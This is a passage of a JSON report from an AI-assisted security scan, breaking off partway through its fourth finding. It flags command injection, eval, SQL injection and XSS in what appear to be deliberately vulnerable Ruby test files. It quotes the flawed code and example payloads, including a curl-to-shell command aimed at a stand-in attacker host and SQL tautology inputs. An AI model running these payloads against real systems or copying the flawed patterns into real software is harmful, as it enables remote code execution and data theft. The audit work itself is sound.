@@ -1,0 +1,1754 @@
+{
+  "application_version": "0.2.0",
+  "scan_metadata": {
+    "commit": "ef7646855751464552bda13b150e5d3acff76376",
+    "target": "local",
+    "status": "completed",
+    "gate": "failed",
+    "errors": [],
+    "configuration": {
+      "schema_version": 1,
+      "profile": "fast",
+      "fail_on": "high",
+      "output_dir": "d:\\New folder\\DevSecOps-Agent\\evidence\\8-scenarios-ai-full-2026-11-25\\KB7",
+      "timezone": "Asia/Saigon",
+      "timeout": 600,
+      "max_files": 100000,
+      "allow_dirty": true,
+      "ci": false,
+      "laya": false,
+      "laya_config_path": null,
+      "ai_review": true,
+      "provider_profile": "kojo-bench-tmp",
+      "provider_model": "empero/kojo",
+      "ai_report": true,
+      "max_ai_findings": 10,
+      "max_model_requests": null,
+      "mode": "hunt",
+      "tools": [
+        "native-hunt"
+      ]
+    }
+  },
+  "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+  "generated_at": "2026-11-25T13:56:02.888323+00:00",
+  "counts": {
+    "version": "0.1.0",
+    "total": 10,
+    "confirmed": 0,
+    "rejected": 0,
+    "unresolved": 10,
+    "unprocessed": 0
+  },
+  "coverage_summary": {
+    "owasp-dependency-check": [],
+    "semgrep": [],
+    "gitleaks": []
+  },
+  "owasp_top10": {
+    "edition": "2025",
+    "source_url": "https://top10.owasp.org/2025/",
+    "snapshot_date": "2026-11-04",
+    "classification_only": true,
+    "mapping_basis": "Exact normalized primary/secondary CWEs in OWASP category-specific mapped-CWE lists",
+    "note": "This is a CWE classification of reported findings, not a coverage or compliance assessment. An empty category means No mapped findings reported; it does not mean tested, safe or passed. Counts retain finding status; pending includes unprocessed, triaged, assessed and pending validation. A finding with multiple labels may appear in several rows/categories; do not add those row counts.",
+    "total_findings": 10,
+    "categories": [
+      {
+        "id": "A01:2025",
+        "name": "Broken Access Control",
+        "source_url": "https://top10.owasp.org/2025/A01_2025-Broken_Access_Control/",
+        "source_sha256": "e51ca05866f4213489e82484f1f48ed4d779e1809e87f70449806b496a0320cd",
+        "total": 3,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 3
+        },
+        "finding_ids": [
+          "model-133c74cbc2a4d259",
+          "model-466f136d5b9cefd2",
+          "model-501079420c3a0aaf"
+        ],
+        "cwes": [
+          {
+            "cwe": "CWE-639",
+            "total": 1,
+            "status_counts": {
+              "unprocessed": 0,
+              "triaged": 0,
+              "assessed": 0,
+              "pending_validation": 0,
+              "confirmed": 0,
+              "rejected": 0,
+              "unresolved": 1
+            },
+            "finding_ids": [
+              "model-501079420c3a0aaf"
+            ]
+          },
+          {
+            "cwe": "CWE-862",
+            "total": 2,
+            "status_counts": {
+              "unprocessed": 0,
+              "triaged": 0,
+              "assessed": 0,
+              "pending_validation": 0,
+              "confirmed": 0,
+              "rejected": 0,
+              "unresolved": 2
+            },
+            "finding_ids": [
+              "model-133c74cbc2a4d259",
+              "model-466f136d5b9cefd2"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "A02:2025",
+        "name": "Security Misconfiguration",
+        "source_url": "https://top10.owasp.org/2025/A02_2025-Security_Misconfiguration/",
+        "source_sha256": "532fbbd67f3db734b7ed5d47e0263dd3800fce80e22da327123a88f2947017c9",
+        "total": 0,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 0
+        },
+        "finding_ids": [],
+        "cwes": []
+      },
+      {
+        "id": "A03:2025",
+        "name": "Software Supply Chain Failures",
+        "source_url": "https://top10.owasp.org/2025/A03_2025-Software_Supply_Chain_Failures/",
+        "source_sha256": "66090225ad8f54a836e5b9e94456243baa7d38b70176f4d720668ef36f3a793d",
+        "total": 0,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 0
+        },
+        "finding_ids": [],
+        "cwes": []
+      },
+      {
+        "id": "A04:2025",
+        "name": "Cryptographic Failures",
+        "source_url": "https://top10.owasp.org/2025/A04_2025-Cryptographic_Failures/",
+        "source_sha256": "5b140b4cadf334becc35334278494f98396dc9b5720df6c904688352b51dc834",
+        "total": 0,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 0
+        },
+        "finding_ids": [],
+        "cwes": []
+      },
+      {
+        "id": "A05:2025",
+        "name": "Injection",
+        "source_url": "https://top10.owasp.org/2025/A05_2025-Injection/",
+        "source_sha256": "69d7ec591944699c49b89c544a52cb32adccbfad56c41784ca34fde837822de6",
+        "total": 7,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 7
+        },
+        "finding_ids": [
+          "model-1a49f19ddea57d2b",
+          "model-1cb16bbe2d7e132d",
+          "model-1eae62911d192eb8",
+          "model-86c0885f0cec1daf",
+          "model-ac40b4bbf031c98f",
+          "model-c2b6b14f556a90d7",
+          "model-ccb26c19b27f8e36"
+        ],
+        "cwes": [
+          {
+            "cwe": "CWE-78",
+            "total": 2,
+            "status_counts": {
+              "unprocessed": 0,
+              "triaged": 0,
+              "assessed": 0,
+              "pending_validation": 0,
+              "confirmed": 0,
+              "rejected": 0,
+              "unresolved": 2
+            },
+            "finding_ids": [
+              "model-1cb16bbe2d7e132d",
+              "model-1eae62911d192eb8"
+            ]
+          },
+          {
+            "cwe": "CWE-79",
+            "total": 1,
+            "status_counts": {
+              "unprocessed": 0,
+              "triaged": 0,
+              "assessed": 0,
+              "pending_validation": 0,
+              "confirmed": 0,
+              "rejected": 0,
+              "unresolved": 1
+            },
+            "finding_ids": [
+              "model-86c0885f0cec1daf"
+            ]
+          },
+          {
+            "cwe": "CWE-89",
+            "total": 2,
+            "status_counts": {
+              "unprocessed": 0,
+              "triaged": 0,
+              "assessed": 0,
+              "pending_validation": 0,
+              "confirmed": 0,
+              "rejected": 0,
+              "unresolved": 2
+            },
+            "finding_ids": [
+              "model-c2b6b14f556a90d7",
+              "model-ccb26c19b27f8e36"
+            ]
+          },
+          {
+            "cwe": "CWE-95",
+            "total": 2,
+            "status_counts": {
+              "unprocessed": 0,
+              "triaged": 0,
+              "assessed": 0,
+              "pending_validation": 0,
+              "confirmed": 0,
+              "rejected": 0,
+              "unresolved": 2
+            },
+            "finding_ids": [
+              "model-1a49f19ddea57d2b",
+              "model-ac40b4bbf031c98f"
+            ]
+          }
+        ]
+      },
+      {
+        "id": "A06:2025",
+        "name": "Insecure Design",
+        "source_url": "https://top10.owasp.org/2025/A06_2025-Insecure_Design/",
+        "source_sha256": "cf67ac90b3c088ca4566807fbc4bbd2090bccc81d61f15c0e25190032618195f",
+        "total": 0,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 0
+        },
+        "finding_ids": [],
+        "cwes": []
+      },
+      {
+        "id": "A07:2025",
+        "name": "Authentication Failures",
+        "source_url": "https://top10.owasp.org/2025/A07_2025-Authentication_Failures/",
+        "source_sha256": "9decccf146242740ba34b1c14df7b729ef159274a3533182c6bcefc9f52c8816",
+        "total": 0,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 0
+        },
+        "finding_ids": [],
+        "cwes": []
+      },
+      {
+        "id": "A08:2025",
+        "name": "Software or Data Integrity Failures",
+        "source_url": "https://top10.owasp.org/2025/A08_2025-Software_or_Data_Integrity_Failures/",
+        "source_sha256": "03082e5a3ce031d6d2425927653aca0ad47d474dafb4208862e86b4363d66d85",
+        "total": 0,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 0
+        },
+        "finding_ids": [],
+        "cwes": []
+      },
+      {
+        "id": "A09:2025",
+        "name": "Security Logging & Alerting Failures",
+        "source_url": "https://top10.owasp.org/2025/A09_2025-Security_Logging_and_Alerting_Failures/",
+        "source_sha256": "e8f875d2db062bfd3eb00db65486b30dd64c417357f9346a395cf434b5055f31",
+        "total": 0,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 0
+        },
+        "finding_ids": [],
+        "cwes": []
+      },
+      {
+        "id": "A10:2025",
+        "name": "Mishandling of Exceptional Conditions",
+        "source_url": "https://top10.owasp.org/2025/A10_2025-Mishandling_of_Exceptional_Conditions/",
+        "source_sha256": "492a7444a58c06ec76af06ed4f89e656804cde6b71f61ba2ed5703a9aa343864",
+        "total": 0,
+        "status_counts": {
+          "unprocessed": 0,
+          "triaged": 0,
+          "assessed": 0,
+          "pending_validation": 0,
+          "confirmed": 0,
+          "rejected": 0,
+          "unresolved": 0
+        },
+        "finding_ids": [],
+        "cwes": []
+      }
+    ],
+    "unmapped": []
+  },
+  "findings": [
+    {
+      "version": "0.1.0",
+      "finding_id": "model-1cb16bbe2d7e132d",
+      "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+      "fingerprint": "1cb16bbe2d7e132d336d523b019fa6897b8744b850429263d5168ee1aa87cf6f",
+      "title": "OS command injection via unsanitized params[:dir] in system()",
+      "description": "The controller concatenates the attacker-controlled request parameter params[:dir] into a single command string passed to Kernel#system. Because the whole command is one shell string, Ruby invokes it through /bin/sh, so shell metacharacters are interpreted. A request such as ?dir=. ; id or ?dir=$(curl attacker.tld/x|sh) yields arbitrary command execution as the Rails process user.",
+      "cwe_category": "CWE-78",
+      "additional_cwe_labels": [],
+      "severity": "critical",
+      "status": "unresolved",
+      "provenance": "model",
+      "observations": [
+        {
+          "version": "0.1.0",
+          "observation_id": "model-1cb16bbe2d7e132d-obs",
+          "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+          "tool": "native-hunt",
+          "tool_version": "model-hunt",
+          "rule_id": "model-hunt",
+          "rule_pack_version": null,
+          "cwe_category": "CWE-78",
+          "severity": "critical",
+          "native_severity": null,
+          "message": "The controller concatenates the attacker-controlled request parameter params[:dir] into a single command string passed to Kernel#system. Because the whole command is one shell string, Ruby invokes it through /bin/sh, so shell metacharacters are interpreted. A request such as ?dir=. ; id or ?dir=$(curl attacker.tld/x|sh) yields arbitrary command execution as the Rails process user.",
+          "confidence": 1.0,
+          "location": {
+            "version": "0.1.0",
+            "file_path": "app/vuln_cmd.rb",
+            "language": "ruby",
+            "line_start": 3,
+            "line_end": null,
+            "column_start": null,
+            "column_end": null,
+            "symbol": null,
+            "snippet": "--- app/vuln_cmd.rb (lines 1-5) ---\n1: class FilesController < ApplicationController\n2:   def list\n3:     system(\"ls \" + params[:dir])\n4:   end\n5: end"
+          },
+          "dependency_identity": null,
+          "raw_output_ref": null,
+          "detected_at": "2026-11-25T13:53:57.955578Z",
+          "metadata": {
+            "model_tool": "model-hunt"
+          }
+        }
+      ],
+      "groups": [],
+      "evidence_strength": "none",
+      "evidence_refs": [
+        "model-1cb16bbe2d7e132d-obs"
+      ],
+      "created_at": "2026-11-25T13:53:57.955578Z",
+      "updated_at": "2026-11-25T13:53:57.955578Z",
+      "metadata": {
+        "title": "OS command injection via unsanitized params[:dir] in system()",
+        "rationale": "The controller concatenates the attacker-controlled request parameter params[:dir] into a single command string passed to Kernel#system. Because the whole command is one shell string, Ruby invokes it through /bin/sh, so shell metacharacters are interpreted. A request such as ?dir=. ; id or ?dir=$(curl attacker.tld/x|sh) yields arbitrary command execution as the Rails process user.",
+        "evidence": "system(\"ls \" + params[:dir])",
+        "validation_decision": {
+          "version": "0.1.0",
+          "decision_id": "val-model-1cb16bbe2d7e132d",
+          "finding_id": "model-1cb16bbe2d7e132d",
+          "previous_status": "unprocessed",
+          "new_status": "unresolved",
+          "outcome": "inconclusive",
+          "evidence_refs": [
+            "ev-model-1cb16bbe2d7e132d-model-1cb16bbe2d7e132d-obs",
+            "ev-model-1cb16bbe2d7e132d-model"
+          ],
+          "evidence_strength": "weak",
+          "rationale": "Insufficient independent evidence. Scanner detections, model proposals and incomplete procedures do not establish confirmation or rejection.",
+          "decided_by": "independent-validator",
+          "decided_at": "2026-11-25T13:55:50.922454Z",
+          "metadata": {
+            "policy": "independent-evidence/2",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "assessment_id": "assess-model-1cb16bbe2d7e132d-ai",
+            "supporting_evidence": [],
+            "counterevidence": [],
+            "supporting_verification": [],
+            "counter_verification": [],
+            "conflicting_ids": [],
+            "verification_outcomes": {},
+            "ignored": [
+              {
+                "id": "ev-model-1cb16bbe2d7e132d-model-1cb16bbe2d7e132d-obs",
+                "reason": "not independently verified supporting/counter evidence"
+              },
+              {
+                "id": "ev-model-1cb16bbe2d7e132d-model",
+                "reason": "not independently verified supporting/counter evidence"
+              }
+            ],
+            "model_proposal_used_for_status": false
+          }
+        },
+        "ai_assessments": [
+          {
+            "version": "0.1.0",
+            "assessment_id": "assess-model-1cb16bbe2d7e132d-ai",
+            "finding_id": "model-1cb16bbe2d7e132d",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "proposed_status": "confirmed",
+            "proposed_severity": "undetermined",
+            "cwe_category": null,
+            "cvss": null,
+            "confidence": 0.85,
+            "assumptions": [
+              "FilesController is mounted as a Rails controller and its #list action is routed, per Rails convention; no routes file exists in the snapshot to confirm this.",
+              "params[:dir] is attacker-controllable request input; it is read directly from params with no filtering visible in the snapshot.",
+              "Authentication/authorization state of the action is unknown: ApplicationController and any before_action guards are not in the snapshot, so the CWE-862 claim of 'no auth anywhere' is not verifiable and PR/privilege metrics are unset.",
+              "The Ruby runtime is standard MRI where single-string Kernel#system goes through /bin/sh; no evidence of an overridden system() in the snapshot.",
+              "Corroboration comes from two observations of the same native-hunt model run, not independent scanners; Semgrep and CodeQL were unavailable and neither supports Ruby in this environment.",
+              "Remediation: use the argument-list form system('ls', params[:dir]) or pass through Shellwords.escape, and add an allowlist/validation for the directory value; also confirm auth and path-traversal handling for the action."
+            ],
+            "rationale": "Verified app/vuln_cmd.rb:3 directly via inspect_code: system(\"ls \" + params[:dir]) concatenates the request-controlled params[:dir] into a single command string. Ruby's Kernel#system with a single string argument invokes the command through /bin/sh, so shell metacharacters (;, |, $(), backticks, &&) are interpreted, giving arbitrary command execution as the Rails process user. No sanitization, allowlist, or shell-escaping wrapper exists anywhere in the snapshot (grep_code found no other reference to params[:dir] or a wrapper). The sibling app/safe_cmd.rb uses the argument-list form system(\"ls\", \"-la\"), confirming the intended safe pattern was known and not applied here. Confidence is 0.85 rather than higher because no routes.rb/config is present to prove FilesController#list is HTTP-reachable, and ApplicationController is absent so authentication cannot be confirmed or excluded; both are unknown, not safe.",
+            "evidence_refs": [
+              "model-1cb16bbe2d7e132d-obs"
+            ],
+            "evidence_strength": "none",
+            "validation_outcome": "inconclusive",
+            "validation_decision_id": "val-model-1cb16bbe2d7e132d",
+            "model_id": "empero/kojo",
+            "model_version": "v1",
+            "provider_id": "kojo-bench-tmp",
+            "context_evidence_id": null,
+            "created_at": "2026-11-25T13:54:34.956641Z",
+            "metadata": {
+              "tool_calls_made": 13,
+              "total_tokens": 51504,
+              "verdict_explicit": true,
+              "cvss_validation_errors": [],
+              "cvss_score_status": "not_provided"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "version": "0.1.0",
+      "finding_id": "model-ac40b4bbf031c98f",
+      "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+      "fingerprint": "ac40b4bbf031c98f957721a8ac379352a4889a7e1ece20f8bcd3b4a7c60fc20c",
+      "title": "Remote code execution via eval() of request parameter",
+      "description": "params[:expr] is passed straight to Kernel#eval and its return value rendered. Any request can execute arbitrary Ruby in the application context (e.g. ?expr=system('id') or ?expr=`whoami`), giving full server compromise. No allowlist, parsing, or sandboxing is applied.",
+      "cwe_category": "CWE-95",
+      "additional_cwe_labels": [],
+      "severity": "critical",
+      "status": "unresolved",
+      "provenance": "model",
+      "observations": [
+        {
+          "version": "0.1.0",
+          "observation_id": "model-ac40b4bbf031c98f-obs",
+          "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+          "tool": "native-hunt",
+          "tool_version": "model-hunt",
+          "rule_id": "model-hunt",
+          "rule_pack_version": null,
+          "cwe_category": "CWE-95",
+          "severity": "critical",
+          "native_severity": null,
+          "message": "params[:expr] is passed straight to Kernel#eval and its return value rendered. Any request can execute arbitrary Ruby in the application context (e.g. ?expr=system('id') or ?expr=`whoami`), giving full server compromise. No allowlist, parsing, or sandboxing is applied.",
+          "confidence": 1.0,
+          "location": {
+            "version": "0.1.0",
+            "file_path": "app/vuln_eval.rb",
+            "language": "ruby",
+            "line_start": 3,
+            "line_end": null,
+            "column_start": null,
+            "column_end": null,
+            "symbol": null,
+            "snippet": "--- app/vuln_eval.rb (lines 1-5) ---\n1: class CalcController < ApplicationController\n2:   def compute\n3:     render plain: eval(params[:expr])\n4:   end\n5: end"
+          },
+          "dependency_identity": null,
+          "raw_output_ref": null,
+          "detected_at": "2026-11-25T13:53:57.957122Z",
+          "metadata": {
+            "model_tool": "model-hunt"
+          }
+        }
+      ],
+      "groups": [],
+      "evidence_strength": "none",
+      "evidence_refs": [
+        "model-ac40b4bbf031c98f-obs"
+      ],
+      "created_at": "2026-11-25T13:53:57.957122Z",
+      "updated_at": "2026-11-25T13:53:57.957122Z",
+      "metadata": {
+        "title": "Remote code execution via eval() of request parameter",
+        "rationale": "params[:expr] is passed straight to Kernel#eval and its return value rendered. Any request can execute arbitrary Ruby in the application context (e.g. ?expr=system('id') or ?expr=`whoami`), giving full server compromise. No allowlist, parsing, or sandboxing is applied.",
+        "evidence": "render plain: eval(params[:expr])",
+        "validation_decision": {
+          "version": "0.1.0",
+          "decision_id": "val-model-ac40b4bbf031c98f",
+          "finding_id": "model-ac40b4bbf031c98f",
+          "previous_status": "unprocessed",
+          "new_status": "unresolved",
+          "outcome": "inconclusive",
+          "evidence_refs": [
+            "ev-model-ac40b4bbf031c98f-model-ac40b4bbf031c98f-obs",
+            "ev-model-ac40b4bbf031c98f-model"
+          ],
+          "evidence_strength": "weak",
+          "rationale": "Insufficient independent evidence. Scanner detections, model proposals and incomplete procedures do not establish confirmation or rejection.",
+          "decided_by": "independent-validator",
+          "decided_at": "2026-11-25T13:55:50.922454Z",
+          "metadata": {
+            "policy": "independent-evidence/2",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "assessment_id": "assess-model-ac40b4bbf031c98f-single",
+            "supporting_evidence": [],
+            "counterevidence": [],
+            "supporting_verification": [],
+            "counter_verification": [],
+            "conflicting_ids": [],
+            "verification_outcomes": {},
+            "ignored": [
+              {
+                "id": "ev-model-ac40b4bbf031c98f-model-ac40b4bbf031c98f-obs",
+                "reason": "not independently verified supporting/counter evidence"
+              },
+              {
+                "id": "ev-model-ac40b4bbf031c98f-model",
+                "reason": "not independently verified supporting/counter evidence"
+              }
+            ],
+            "model_proposal_used_for_status": false
+          }
+        },
+        "ai_assessments": [
+          {
+            "version": "0.1.0",
+            "assessment_id": "assess-model-ac40b4bbf031c98f-single",
+            "finding_id": "model-ac40b4bbf031c98f",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "proposed_status": "confirmed",
+            "proposed_severity": "undetermined",
+            "cwe_category": null,
+            "cvss": {
+              "version": "4.0",
+              "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+              "base_score": 10.0,
+              "qualitative": "critical",
+              "source": "ai-proposal",
+              "notes": "",
+              "overall_score": 10.0,
+              "base_rating": "Critical",
+              "overall_rating": "Critical",
+              "nomenclature": "CVSS-B",
+              "calculation_source": "FIRST CVSS v4.0",
+              "metric_assumptions_verified": false
+            },
+            "confidence": 0.97,
+            "assumptions": [
+              "The CalcController#compute action is reachable by an attacker via a route (routes.rb is not shown).",
+              "No upstream authentication, authorization filter, or WAF constrains or filters params[:expr] (not shown in the excerpt).",
+              "The application runs the vulnerable version of this file in the deployed environment."
+            ],
+            "rationale": "Line 3 of app/vuln_eval.rb passes params[:expr] directly into Kernel#eval with no allowlist, parser, or sandbox, so a request such as ?expr=system('id') or ?expr=`whoami` executes arbitrary Ruby in the Rails process before render plain: emits anything. That is full application-context code execution, not just information disclosure.",
+            "evidence_refs": [
+              "model-ac40b4bbf031c98f-obs"
+            ],
+            "evidence_strength": "none",
+            "validation_outcome": "inconclusive",
+            "validation_decision_id": "val-model-ac40b4bbf031c98f",
+            "model_id": "kojo",
+            "model_version": "v1",
+            "provider_id": "kojo-bench-tmp",
+            "context_evidence_id": null,
+            "created_at": "2026-11-25T13:54:15.697792Z",
+            "metadata": {
+              "single_shot": true,
+              "total_tokens": 1304,
+              "verdict_explicit": true,
+              "cvss_validation_errors": [],
+              "cvss_score_status": "computed"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "version": "0.1.0",
+      "finding_id": "model-ccb26c19b27f8e36",
+      "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+      "fingerprint": "ccb26c19b27f8e3697942ce881376749a2af4b5b0a222e72922d7f3063fd9ac4",
+      "title": "SQL injection in ActiveRecord where() string interpolation",
+      "description": "The name filter is built by interpolating params[:name] into a SQL fragment passed to User.where, which ActiveRecord treats as raw SQL. An input such as ' OR '1'='1 or ' UNION SELECT ... exposes or exfiltrates the whole users table and can be extended to stacked/boolean-based extraction.",
+      "cwe_category": "CWE-89",
+      "additional_cwe_labels": [],
+      "severity": "critical",
+      "status": "unresolved",
+      "provenance": "model",
+      "observations": [
+        {
+          "version": "0.1.0",
+          "observation_id": "model-ccb26c19b27f8e36-obs",
+          "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+          "tool": "native-hunt",
+          "tool_version": "model-hunt",
+          "rule_id": "model-hunt",
+          "rule_pack_version": null,
+          "cwe_category": "CWE-89",
+          "severity": "critical",
+          "native_severity": null,
+          "message": "The name filter is built by interpolating params[:name] into a SQL fragment passed to User.where, which ActiveRecord treats as raw SQL. An input such as ' OR '1'='1 or ' UNION SELECT ... exposes or exfiltrates the whole users table and can be extended to stacked/boolean-based extraction.",
+          "confidence": 1.0,
+          "location": {
+            "version": "0.1.0",
+            "file_path": "app/vuln_sql.rb",
+            "language": "ruby",
+            "line_start": 3,
+            "line_end": null,
+            "column_start": null,
+            "column_end": null,
+            "symbol": null,
+            "snippet": "--- app/vuln_sql.rb (lines 1-5) ---\n1: class UsersController < ApplicationController\n2:   def show\n3:     @users = User.where(\"name = '#{params[:name]}'\")\n4:   end\n5: end"
+          },
+          "dependency_identity": null,
+          "raw_output_ref": null,
+          "detected_at": "2026-11-25T13:53:57.958147Z",
+          "metadata": {
+            "model_tool": "model-hunt"
+          }
+        }
+      ],
+      "groups": [],
+      "evidence_strength": "none",
+      "evidence_refs": [
+        "model-ccb26c19b27f8e36-obs"
+      ],
+      "created_at": "2026-11-25T13:53:57.958147Z",
+      "updated_at": "2026-11-25T13:53:57.958147Z",
+      "metadata": {
+        "title": "SQL injection in ActiveRecord where() string interpolation",
+        "rationale": "The name filter is built by interpolating params[:name] into a SQL fragment passed to User.where, which ActiveRecord treats as raw SQL. An input such as ' OR '1'='1 or ' UNION SELECT ... exposes or exfiltrates the whole users table and can be extended to stacked/boolean-based extraction.",
+        "evidence": "@users = User.where(\"name = '#{params[:name]}'\")",
+        "validation_decision": {
+          "version": "0.1.0",
+          "decision_id": "val-model-ccb26c19b27f8e36",
+          "finding_id": "model-ccb26c19b27f8e36",
+          "previous_status": "unprocessed",
+          "new_status": "unresolved",
+          "outcome": "inconclusive",
+          "evidence_refs": [
+            "ev-model-ccb26c19b27f8e36-model-ccb26c19b27f8e36-obs",
+            "ev-model-ccb26c19b27f8e36-model"
+          ],
+          "evidence_strength": "weak",
+          "rationale": "Insufficient independent evidence. Scanner detections, model proposals and incomplete procedures do not establish confirmation or rejection.",
+          "decided_by": "independent-validator",
+          "decided_at": "2026-11-25T13:55:50.922454Z",
+          "metadata": {
+            "policy": "independent-evidence/2",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "assessment_id": "assess-model-ccb26c19b27f8e36-ai",
+            "supporting_evidence": [],
+            "counterevidence": [],
+            "supporting_verification": [],
+            "counter_verification": [],
+            "conflicting_ids": [],
+            "verification_outcomes": {},
+            "ignored": [
+              {
+                "id": "ev-model-ccb26c19b27f8e36-model-ccb26c19b27f8e36-obs",
+                "reason": "not independently verified supporting/counter evidence"
+              },
+              {
+                "id": "ev-model-ccb26c19b27f8e36-model",
+                "reason": "not independently verified supporting/counter evidence"
+              }
+            ],
+            "model_proposal_used_for_status": false
+          }
+        },
+        "ai_assessments": [
+          {
+            "version": "0.1.0",
+            "assessment_id": "assess-model-ccb26c19b27f8e36-ai",
+            "finding_id": "model-ccb26c19b27f8e36",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "proposed_status": "confirmed_vulnerable",
+            "proposed_severity": "undetermined",
+            "cwe_category": null,
+            "cvss": {
+              "version": "4.0",
+              "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+              "base_score": 9.3,
+              "qualitative": "critical",
+              "source": "ai-proposal",
+              "notes": "",
+              "overall_score": 9.3,
+              "base_rating": "Critical",
+              "overall_rating": "Critical",
+              "nomenclature": "CVSS-B",
+              "calculation_source": "FIRST CVSS v4.0",
+              "metric_assumptions_verified": false
+            },
+            "confidence": 0.95,
+            "assumptions": [
+              "UsersController#show is reachable over HTTP; no routes.rb exists in the snapshot and route lookup returned only a manifest note, so the exact path is unverified.",
+              "No global authentication or WAF exists outside the snapshot; none was observed and none is assumed to mitigate.",
+              "User maps to a real table with a name column; no schema was available to confirm.",
+              "VI:H assumes stacked or UNION write capability; raw where() fragments are typically read-only, so integrity impact carries slightly less certainty than confidentiality impact.",
+              "CVSS metrics are inferred from the code and this controller's lack of an auth layer, not from a runtime proof of exploitation."
+            ],
+            "rationale": "app/vuln_sql.rb:3 passes a double-quoted, interpolated string as a single positional argument to ActiveRecord User.where, which treats it as raw SQL. params[:name] reaches the statement unbound. Grep across all Ruby files found no sanitizer, permit, escape, or before_action, so no control reduces the payload. The sibling file app/safe_sql.rb:3 implements the same lookup with the hash form, confirming the vulnerable variant deliberately uses raw interpolation. Tautology and UNION payloads can return arbitrary rows, and the assigned @users is rendered by ERB views, giving a response channel. Semgrep and CodeQL were both unavailable, so confirmation rests on direct source reading, not tool corroboration.",
+            "evidence_refs": [
+              "model-ccb26c19b27f8e36-obs"
+            ],
+            "evidence_strength": "none",
+            "validation_outcome": "inconclusive",
+            "validation_decision_id": "val-model-ccb26c19b27f8e36",
+            "model_id": "empero/kojo",
+            "model_version": "v1",
+            "provider_id": "kojo-bench-tmp",
+            "context_evidence_id": null,
+            "created_at": "2026-11-25T13:54:34.929413Z",
+            "metadata": {
+              "tool_calls_made": 11,
+              "total_tokens": 50896,
+              "verdict_explicit": true,
+              "cvss_validation_errors": [],
+              "cvss_score_status": "computed"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "version": "0.1.0",
+      "finding_id": "model-86c0885f0cec1daf",
+      "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+      "fingerprint": "86c0885f0cec1daf34b1d146ab0bde190ce19dbfc302b1b0b9723808f984e013",
+      "title": "Cross-site scripting via raw() on user bio in ERB template",
+      "description": "raw() marks @user.bio as html_safe, bypassing Rails' default ERB output escaping. A user-controlled bio containing <script> or an event-handler attribute executes in the browser of anyone viewing the profile, enabling session theft and account takeover. Contrast app/safe_view.erb, which uses plain <%= %>.",
+      "cwe_category": "CWE-79",
+      "additional_cwe_labels": [],
+      "severity": "high",
+      "status": "unresolved",
+      "provenance": "model",
+      "observations": [
+        {
+          "version": "0.1.0",
+          "observation_id": "model-86c0885f0cec1daf-obs",
+          "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+          "tool": "native-hunt",
+          "tool_version": "model-hunt",
+          "rule_id": "model-hunt",
+          "rule_pack_version": null,
+          "cwe_category": "CWE-79",
+          "severity": "high",
+          "native_severity": null,
+          "message": "raw() marks @user.bio as html_safe, bypassing Rails' default ERB output escaping. A user-controlled bio containing <script> or an event-handler attribute executes in the browser of anyone viewing the profile, enabling session theft and account takeover. Contrast app/safe_view.erb, which uses plain <%= %>.",
+          "confidence": 1.0,
+          "location": {
+            "version": "0.1.0",
+            "file_path": "app/vuln_view.erb",
+            "language": "ruby",
+            "line_start": 1,
+            "line_end": null,
+            "column_start": null,
+            "column_end": null,
+            "symbol": null,
+            "snippet": "--- app/vuln_view.erb (lines 1-1) ---\n1: <div class=\"profile\"><%= raw @user.bio %></div>"
+          },
+          "dependency_identity": null,
+          "raw_output_ref": null,
+          "detected_at": "2026-11-25T13:53:57.959143Z",
+          "metadata": {
+            "model_tool": "model-hunt"
+          }
+        }
+      ],
+      "groups": [],
+      "evidence_strength": "none",
+      "evidence_refs": [
+        "model-86c0885f0cec1daf-obs"
+      ],
+      "created_at": "2026-11-25T13:53:57.959143Z",
+      "updated_at": "2026-11-25T13:53:57.959143Z",
+      "metadata": {
